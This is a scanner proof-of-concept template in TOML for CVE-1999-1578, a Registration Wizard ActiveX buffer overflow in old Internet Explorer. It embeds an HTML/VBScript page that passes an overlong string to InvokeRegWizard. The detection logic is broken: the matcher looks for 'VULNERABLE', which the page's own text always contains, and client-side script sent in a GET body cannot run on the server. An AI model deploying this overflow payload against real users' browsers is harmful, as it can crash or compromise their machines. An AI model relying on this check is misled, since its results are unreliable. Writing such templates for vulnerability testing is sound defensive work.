[info]
author = "AVE"
description = "检测目标是否受 Internet Explorer 4.01/5 中 Registration Wizard ActiveX 控件 (regwizc.dll) 缓冲区溢出漏洞影响，通过构造含超长参数的恶意 HTML 页面触发 InvokeRegWizard 方法溢出"
id = "POC-AVE-1999-1196"
name = "CVE-1999-1578 PoC"
severity = "medium"
tags = [
    "cve-1999-1578",
    "buffer-overflow",
    "activex",
    "ie",
]
vuln_id = [
    "CVE-1999-1578",
    "AVE-1999-1196",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc-1999-1578.html"
protocol = "http"

[poc.requests.body]
content = """
<html>
<body>
<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
<script language="VBScript">
expstr = "/i " & String(260, "A")
On Error Resume Next
RegWizObj.InvokeRegWizard(expstr)
If Err.Number = 0 Then
  document.write("VULNERABLE: Registration Wizard control exploitable")
Else
  document.write("NOT_VULNERABLE: Registration Wizard control not exploitable or not present")
End If
</script>
</body>
</html>
"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["VULNERABLE"]
